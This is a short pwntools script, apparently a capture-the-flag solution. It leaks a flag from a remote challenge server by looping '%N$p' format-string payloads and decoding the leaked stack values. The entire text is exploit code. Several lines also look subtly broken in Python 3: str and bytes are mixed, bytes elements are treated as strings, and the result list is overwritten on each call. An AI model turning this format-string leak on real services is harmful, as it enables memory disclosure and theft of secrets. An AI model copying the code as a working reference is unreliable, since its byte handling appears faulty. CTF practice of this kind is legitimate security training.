# Write the exploit if you have one 
from pwn import *
import sys

context.log_level = "error"

def get_flag_bytes(res, end):
    if(res.find("0xa") != -1):
        end = True
    res = res.replace(b"0x", b"")
    j = 0
    chars = []
    while j < len(res) - 1:
        chars.append(chr(int(res[::-1][j + 1] + res[::-1][j], 16)))
        j += 2
    return end, chars

starting = '7b66746361'
chars = []
is_flag_string = 0
end = False

i = 0
while end != True:
    io = remote("shell.actf.co", 21820)
    
    io.sendline("%" + str(i) + "$p")
    io.recvuntil("Welcome, ")
    res = io.read().strip()
    if(is_flag_string == 1):
        end, chars = get_flag_bytes(res, end)
        sys.stdout.write("\r"+"".join(chars))
    if(res.decode().find(starting) != -1):
        is_flag_string = 1
        end, chars = get_flag_bytes(res, end)
        sys.stdout.write("Flag: ")
        sys.stdout.write("\r"+"".join(chars))
    i += 1
    sys.stdout.flush()

    io.close()
sys.stdout.write("\n")